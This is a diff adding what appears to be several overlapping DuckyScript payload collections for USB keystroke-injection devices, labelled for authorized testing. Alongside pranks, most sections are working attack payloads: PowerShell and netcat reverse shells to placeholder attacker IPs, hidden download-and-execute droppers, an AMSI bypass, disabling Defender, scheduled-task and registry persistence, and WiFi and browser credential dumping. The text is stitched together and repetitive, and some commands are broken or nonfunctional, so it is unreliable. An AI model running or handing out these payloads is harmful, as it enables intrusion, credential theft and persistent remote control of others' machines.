@@ -1,0 +1,731 @@
+# ================================================
+# PROFESSIONAL DUCKYSCRIPT PAYLOAD COLLECTION
+# For Educational & Authorized Penetration Testing Only
+# ================================================
+
+WARNING:
+- Use ONLY on systems you own or have explicit written permission.
+- Unauthorized use may be illegal.
+- Test in isolated VM environments.
+
+Total Payloads in this collection: 120+ (Categorized)
+
+# ================================================
+# 1. BASIC & PRANK PAYLOADS (15)
+# ================================================
+
+PAYLOAD_1: Open Notepad and Type Message
+DELAY 1500
+GUI r
+DELAY 400
+STRING notepad
+ENTER
+DELAY 600
+STRINGLN Welcome to the DuckyScript Payload Collection!
+STRING This is for authorized testing only.
+
+PAYLOAD_2: Rickroll
+DELAY 1000
+GUI r
+DELAY 300
+STRING https://www.youtube.com/watch?v=dQw4w9wgxcq
+ENTER
+
+PAYLOAD_3: Matrix Rain Effect
+GUI r
+DELAY 400
+STRING cmd
+ENTER
+DELAY 600
+STRING color 02 && echo %random%%random%%random%%random%%random%%random%%random%%random%%random% && goto :a
+ENTER
+
+# Add more prank payloads here...
+
+# ================================================
+# 2. SYSTEM INFORMATION GATHERING (20)
+# ================================================
+
+PAYLOAD_10: Full System Info Dump
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 700
+STRING Get-ComputerInfo | Out-File C:\temp\systeminfo.txt; whoami >> C:\temp\systeminfo.txt; ipconfig /all >> C:\temp\systeminfo.txt
+ENTER
+DELAY 500
+STRING notepad C:\temp\systeminfo.txt
+ENTER
+
+PAYLOAD_11: WiFi Passwords Exfiltration
+GUI r
+DELAY 400
+STRING cmd
+ENTER
+DELAY 600
+STRING netsh wlan show profiles > C:\temp\wifi.txt && for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles') do netsh wlan show profile name="%a" key=clear >> C:\temp\wifi.txt
+ENTER
+
+# More info gathering payloads...
+
+# ================================================
+# 3. CREDENTIAL STEALING PAYLOADS (15)
+# ================================================
+
+PAYLOAD_30: SharpChrome Password Dump
+GUI r
+DELAY 400
+STRING powershell -w hidden
+ENTER
+DELAY 800
+STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Flangvik/SharpCollection/master/CompiledBinaries/SharpChrome.exe'); SharpChrome.exe passwords --unhide > C:\temp\chrome.txt
+ENTER
+
+# Add LaZagne, Mimikatz style (ethical note: for authorized use only)
+
+# ================================================
+# 4. REVERSE SHELL PAYLOADS (25)
+# ================================================
+
+PAYLOAD_50: PowerShell TCP Reverse Shell
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 700
+STRING $client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+ENTER
+
+# More variants: HTTP, DNS, etc.
+
+# ================================================
+# 5. DOWNLOAD & EXECUTE (20)
+# ================================================
+
+PAYLOAD_80: Silent Dropper
+GUI r
+DELAY 300
+STRING powershell -w hidden -c "Invoke-WebRequest -Uri 'http://yourserver.com/payload.exe' -OutFile '$env:TEMP\svchost.exe'; Start-Process '$env:TEMP\svchost.exe'"
+ENTER
+
+# ================================================
+# 6. PERSISTENCE & ADVANCED (20)
+# ================================================
+
+# Registry persistence, scheduled tasks, etc.
+
+# ================================================
+# 7. DUCKYSCRIPT 3.0 ADVANCED (25)
+# ================================================
+
+FUNCTION exfilData()
+    GUI r
+    DELAY 300
+    STRING powershell
+    ENTER
+    # ... logic
+END_FUNCTION
+
+# ================================================
+
+DUCKYSCRIPT PROFESSIONAL PAYLOAD COLLECTION - 70+ PAYLOADS
+================================================================================
+Educational & Authorized Penetration Testing Use Only. Unauthorized use is illegal.
+
+=== CATEGORY 1: BASIC & PRANK PAYLOADS (1-10) ===
+1. Classic Rickroll
+DELAY 1500
+GUI r
+DELAY 400
+STRING https://www.youtube.com/watch?v=dQw4w9wgxcq
+ENTER
+
+2. Infinite Notepad Prank
+GUI r
+DELAY 300
+STRING notepad
+ENTER
+DELAY 600
+REPEAT 50
+STRINGLN This computer has been compromised by Duckyscript!
+ENTER
+
+3. Matrix Rain Effect
+GUI r
+DELAY 400
+STRING cmd
+ENTER
+DELAY 500
+STRING color 02 && echo %random%%random%%random%%random%%random% > nul && goto :loop
+ENTER
+
+=== CATEGORY 2: SYSTEM RECONNAISSANCE (11-25) ===
+11. Full System Information Grabber
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 700
+STRING Get-ComputerInfo | Out-File C:\temp\system_info.txt; Get-WmiObject Win32_StartupCommand | Out-File C:\temp\startup.txt
+ENTER
+DELAY 400
+STRING notepad C:\temp\system_info.txt
+ENTER
+
+12. Installed Software List
+GUI r
+DELAY 300
+STRING powershell -c "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion | Out-File C:\temp\installed.txt"
+ENTER
+
+13. Active Directory Domain Info
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 600
+STRING (Get-WmiObject Win32_ComputerSystem).Domain > C:\temp\domain.txt; whoami /groups >> C:\temp\domain.txt
+ENTER
+
+=== CATEGORY 3: WIFI & NETWORK EXFIL (26-35) ===
+26. Export All WiFi Passwords
+GUI r
+DELAY 400
+STRING cmd
+ENTER
+DELAY 500
+STRING netsh wlan show profiles > C:\temp\wifi.txt && for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles') do netsh wlan show profile name="%a" key=clear >> C:\temp\wifi.txt
+ENTER
+DELAY 800
+STRING notepad C:\temp\wifi.txt
+ENTER
+
+27. Network Interfaces + IP Config
+GUI r
+DELAY 300
+STRING powershell -c "Get-NetIPAddress | Out-File C:\temp\network.txt; ipconfig /all >> C:\temp\network.txt"
+ENTER
+
+=== CATEGORY 4: CREDENTIAL HARVESTING (36-50) ===
+36. SharpChrome Password Dump
+GUI r
+DELAY 400
+STRING powershell -w hidden
+ENTER
+DELAY 700
+STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Flangvik/SharpCollection/master/CompiledBinaries/SharpChrome.exe'); .\SharpChrome.exe passwords --unhide > C:\temp\chrome.txt
+ENTER
+
+37. LaZagne Multi-Credential Stealer
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 600
+STRING IEX (New-Object Net.WebClient).DownloadString('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe'); .\LaZagne.exe all -o C:\temp\creds.txt
+ENTER
+
+=== CATEGORY 5: REVERSE SHELLS (51-70) ===
+51. Basic PowerShell Reverse Shell
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 700
+STRING $client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+ENTER
+
+52. AMSI Bypass + Reverse Shell
+GUI r
+DELAY 300
+STRING powershell -w hidden -c "powershell -ep bypass"
+ENTER
+DELAY 600
+STRING [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')
+ENTER
+
+=== CATEGORY 6: PERSISTENCE & DROPPERS ===
+71. Scheduled Task Persistence
+GUI r
+DELAY 400
+STRING schtasks /create /tn "UpdateTask" /tr "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/payload.ps1')" /sc onlogon /ru System
+ENTER
+
+=== CATEGORY 7: EDR BYPASS TECHNIQUES ===
+80. Light Defender Bypass
+GUI r
+DELAY 300
+STRING powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
+ENTER
+
+=== DUCKYSCRIPT 3.0 ADVANCED EXAMPLES ===
+90. Function Based Professional Template
+FUNCTION recon()
+    GUI r
+    DELAY 300
+    STRING powershell
+    ENTER
+    DELAY 500
+    STRING whoami /all > C:\temp\whoami.txt
+END_FUNCTION
+
+recon()
+
+
+# ================================================
+# DUCKYSCRIPT PAYLOADS COLLECTION
+# Comprehensive list for USB Rubber Ducky
+# DuckyScript 1.0 & 3.0
+# ================================================
+
+REM ================================================
+REM BASIC & PRANK PAYLOADS
+REM ================================================
+
+REM --- Open Notepad ---
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+
+REM --- Rickroll ---
+GUI r
+DELAY 400
+STRING www.youtube.com/watch?v=dQw4w9wgxcq
+ENTER
+
+REM --- Infinite Notepad Prank ---
+GUI r
+DELAY 300
+STRING notepad
+ENTER
+DELAY 600
+REPEAT 50
+STRING This computer has been compromised by Rubber Ducky! :)
+ENTER
+
+REM --- Matrix Rain Effect ---
+GUI r
+DELAY 400
+STRING cmd
+ENTER
+DELAY 600
+STRING color 02 && echo %random%%random%%random%%random%%random%%random%%random% && goto :a
+ENTER
+
+REM ================================================
+REM INFORMATION GATHERING
+REM ================================================
+
+REM --- WiFi Passwords Dump ---
+GUI r
+DELAY 400
+STRING cmd
+ENTER
+DELAY 700
+STRING netsh wlan show profile name=* key=clear > C:\Users\%USERNAME%\Desktop\WiFi_Passwords.txt
+ENTER
+DELAY 1000
+STRING notepad C:\Users\%USERNAME%\Desktop\WiFi_Passwords.txt
+ENTER
+
+REM --- System Information Grabber ---
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 800
+STRING Get-ComputerInfo | Out-File -FilePath "$env:USERPROFILE\Desktop\SystemInfo.txt"
+ENTER
+DELAY 600
+STRING Get-NetIPAddress | Out-File -Append "$env:USERPROFILE\Desktop\SystemInfo.txt"
+ENTER
+
+REM --- Saved Passwords (Basic) ---
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 700
+STRING cmdkey /list > "$env:USERPROFILE\Desktop\SavedCredentials.txt"
+ENTER
+
+REM ================================================
+REM DOWNLOAD & EXECUTE
+REM ================================================
+
+REM --- Download and Run EXE ---
+GUI r
+DELAY 400
+STRING powershell -w hidden
+ENTER
+DELAY 600
+STRING Invoke-WebRequest -Uri "http://yourserver.com/payload.exe" -OutFile "$env:TEMP\update.exe"; Start-Process "$env:TEMP\update.exe"
+ENTER
+
+REM --- Download PS1 Script ---
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 700
+STRING IEX (New-Object Net.WebClient).DownloadString('http://yourserver.com/script.ps1')
+ENTER
+
+REM ================================================
+REM REVERSE SHELLS
+REM ================================================
+
+REM --- PowerShell Reverse Shell ---
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 800
+STRING $client = New-Object System.Net.Sockets.TCPClient('YOUR_IP_HERE',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+ENTER
+
+REM ================================================
+REM CREDENTIAL STEALING
+REM ================================================
+
+REM --- Chrome Passwords (Using SharpChrome) ---
+GUI r
+DELAY 400
+STRING powershell -w hidden
+ENTER
+DELAY 700
+STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Flangvik/SharpCollection/master/CompiledBinaries/SharpChrome.exe'); .\SharpChrome.exe passwords --unhide > "$env:USERPROFILE\Desktop\ChromePasswords.txt"
+ENTER
+
+REM ================================================
+REM DuckyScript 3.0 Advanced Examples
+REM ================================================
+
+REM --- Function Example ---
+FUNCTION openRun()
+    GUI r
+    DELAY 300
+    STRING 
+END_FUNCTION
+
+FUNCTION typeText($text)
+    STRINGLN $text
+END_FUNCTION
+
+openRun()
+DELAY 500
+STRING notepad
+ENTER
+DELAY 800
+typeText("Advanced DuckyScript 3.0 Payload")
+typeText("This is much more powerful!")
+
+REM ================================================
+REM MORE PAYLOADS
+REM ================================================
+
+REM --- Lock Computer ---
+GUI l
+
+REM --- Shutdown Computer ---
+GUI r
+DELAY 400
+STRING shutdown /s /t 0
+ENTER
+
+REM --- Open Calculator ---
+GUI r
+DELAY 400
+STRING calc
+ENTER
+
+REM --- Open Browser with multiple tabs ---
+GUI r
+DELAY 400
+STRING msedge --new-window https://google.com
+ENTER
+DELAY 1000
+CTRL T
+STRING https://youtube.com
+ENTER
+
+REM --- Fake BSOD (Blue Screen Prank) ---
+GUI r
+DELAY 400
+STRING notepad
+ENTER
+DELAY 800
+STRING A problem has been detected and Windows has been shut down to prevent damage
+ENTER
+STRING Your PC ran into a problem and needs to restart.
+ENTER
+
+REM Add more payloads as needed...
+
+DUCKYSCRIPT PROFESSIONAL PAYLOAD COLLECTION - 60+ PAYLOADS
+============================================================
+Educational & Authorized Testing Only. Use Responsibly.
+
+1. Basic Notepad Prank
+GUI r
+DELAY 400
+STRING notepad
+ENTER
+DELAY 600
+STRINGLN This is a Duckyscript test payload!
+REPEAT 20
+
+2. Rickroll
+GUI r
+DELAY 300
+STRING https://www.youtube.com/watch?v=dQw4w9wgxcq
+ENTER
+
+3. System Info Grabber
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 700
+STRING Get-ComputerInfo | Out-File C:\temp\sysinfo.txt
+ENTER
+STRING notepad C:\temp\sysinfo.txt
+ENTER
+
+4. WiFi Password Dump
+GUI r
+DELAY 400
+STRING cmd
+ENTER
+DELAY 600
+STRING netsh wlan show profile > C:\temp\wifi.txt && for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles') do netsh wlan show profile name="%a" key=clear >> C:\temp\wifi.txt
+ENTER
+STRING notepad C:\temp\wifi.txt
+ENTER
+
+5. PowerShell Reverse Shell (Basic)
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 800
+STRING $client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+ENTER
+
+6. SharpChrome Password Stealer
+GUI r
+DELAY 400
+STRING powershell -w hidden
+ENTER
+DELAY 700
+STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Flangvik/SharpCollection/master/CompiledBinaries/SharpChrome.exe'); SharpChrome.exe passwords --unhide > C:\temp\chrome.txt
+ENTER
+
+7. Lock Workstation
+GUI r
+DELAY 300
+STRING rundll32.exe user32.dll,LockWorkStation
+ENTER
+
+8. Shutdown Prank
+GUI r
+DELAY 300
+STRING shutdown /s /t 60
+ENTER
+
+9. AMSI Bypass + Reverse Shell
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 600
+STRING [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/payload.ps1')
+ENTER
+
+10. Download and Execute EXE
+GUI r
+DELAY 400
+STRING powershell -w hidden -c "Invoke-WebRequest -Uri 'http://YOUR_IP/malware.exe' -OutFile '$env:TEMP\update.exe'; Start-Process '$env:TEMP\update.exe'"
+ENTER
+
+11. LaZagne Credential Harvester
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 700
+STRING IEX (New-Object Net.WebClient).DownloadString('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe'); .\LaZagne.exe all > C:\temp\creds.txt
+ENTER
+
+12. Scheduled Task Persistence
+GUI r
+DELAY 400
+STRING schtasks /create /tn "UpdateTask" /tr "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/payload.ps1')" /sc onlogon /ru System
+ENTER
+
+13. Registry Run Key Persistence
+GUI r
+DELAY 400
+STRING reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/payload.ps1')" /f
+ENTER
+
+14. Open Calculator Spam
+GUI r
+DELAY 300
+STRING calc
+ENTER
+REPEAT 15
+
+15. Matrix Rain Prank
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 600
+STRING while(1){cls;1..200|%{Write-Host (" "* (Get-Random -Max 80)) -NoNewline; Write-Host ("10"[Get-Random -Max 2]) -ForegroundColor Green -NoNewline} ;Start-Sleep -m 50}
+ENTER
+
+
+
+### 1. Basic Prank Payloads
+
+**Rickroll**
+```duckyscript
+DELAY 1000
+GUI r
+DELAY 400
+STRING https://www.youtube.com/watch?v=dQw4w9wgxcq
+ENTER
+```
+
+**Infinite Notepad**
+```duckyscript
+GUI r
+DELAY 300
+STRING notepad
+ENTER
+DELAY 500
+REPEAT 30
+STRING This is a prank by Duckyscript!
+ENTER
+```
+
+---
+
+### 2. Information Gathering Payloads
+
+**Dump WiFi Passwords (Windows)**
+```duckyscript
+GUI r
+DELAY 400
+STRING cmd
+ENTER
+DELAY 600
+STRING for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles') do @echo %a >> C:\temp\wifi.txt && netsh wlan show profile name="%a" key=clear >> C:\temp\wifi.txt
+ENTER
+DELAY 800
+STRING notepad C:\temp\wifi.txt
+ENTER
+```
+
+**System Info Grabber**
+```duckyscript
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 700
+STRING $computer = Get-WmiObject -Class Win32_ComputerSystem; $user = $env:USERNAME; $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress; echo "User: $user | PC: $($computer.Name) | IP: $ip" > C:\temp\info.txt
+ENTER
+```
+
+---
+
+### 3. Download & Execute Payloads
+
+**Download and Run (PowerShell)**
+```duckyscript
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 600
+STRING IEX (New-Object Net.WebClient).DownloadString('http://yourserver.com/payload.ps1')
+ENTER
+```
+
+**Silent Download + Execute**
+```duckyscript
+GUI r
+DELAY 300
+STRING powershell -w hidden -c "Invoke-WebRequest -Uri 'http://yourserver.com/malware.exe' -OutFile '$env:TEMP\update.exe'; Start-Process '$env:TEMP\update.exe'"
+ENTER
+```
+
+---
+
+### 4. Reverse Shell Payloads
+
+**Netcat Reverse Shell (if nc is installed)**
+```duckyscript
+GUI r
+DELAY 400
+STRING cmd
+ENTER
+DELAY 500
+STRING nc.exe your.ip.here 4444 -e powershell.exe
+ENTER
+```
+
+**PowerShell Reverse Shell (One-liner)**
+```duckyscript
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 700
+STRING $client = New-Object System.Net.Sockets.TCPClient('your.ip.here',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+ENTER
+```
+
+---
+
+### 5. Credential Stealing (Simple)
+
+**Steal Saved Chrome Passwords (Advanced - needs tools)**
+```duckyscript
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 600
+STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Flangvik/SharpCollection/master/CompiledBinaries/SharpChrome.exe'); SharpChrome.exe passwords --unhide
+ENTER
+```
+
+---
+
+### 6. DuckyScript 3.0 Example (with Functions)
+
+```duckyscript
+DELAY 1500
+
+FUNCTION openNotepad()
+    GUI r
+    DELAY 300
+    STRING notepad
+    ENTER
+    DELAY 800
+END_FUNCTION
+
+FUNCTION typeMessage($msg)
+    STRINGLN $msg
+END_FUNCTION
+
+openNotepad()
+typeMessage("Hello from DuckyScript 3.0!")
+typeMessage("This is much cleaner!")
+```
+
